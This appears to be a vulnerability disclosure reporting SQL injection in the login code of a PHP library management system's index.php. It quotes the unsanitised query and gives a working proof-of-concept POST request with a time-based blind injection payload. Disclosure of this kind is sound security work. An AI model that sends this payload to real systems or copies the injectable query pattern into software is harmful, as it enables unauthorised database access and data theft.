### Vulnerability file address

`index.php` from line 106

```php
......
......
......
if(isset($_POST['signin']))
{$u=$_POST['RollNo'];
 $p=$_POST['Password'];
 $c=$_POST['Category'];

 $sql="select * from LMS.user where RollNo='$u'";

 $result = $conn->query($sql);
$row = $result->fetch_assoc();
$x=$row['Password'];
$y=$row['Type'];
......
......
......
```

The $u parameter is controllable, the parameter RollNo can be passed through post, and the $u is not protected from sql injection, resulting in sql injection

### POC

not exists any precondition

```http
POST /index.php HTTP/1.1
Host: www.lms.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 85
Origin: http://www.lms.net
Connection: close
Referer: http://www.lms.net/
Upgrade-Insecure-Requests: 1

RollNo=1' or if(ascii(user())=114,sleep(0.5),0)#&Password=1&signin=Sign+In&Category=1
```

### Attack results pictures

Blind sql injection succeed

![image-20220702173846087](https://xianyu123images.oss-cn-hangzhou.aliyuncs.com/20220702173846.png)



Blind sql injection failed

![image-20220702173857417](https://xianyu123images.oss-cn-hangzhou.aliyuncs.com/20220702173857.png)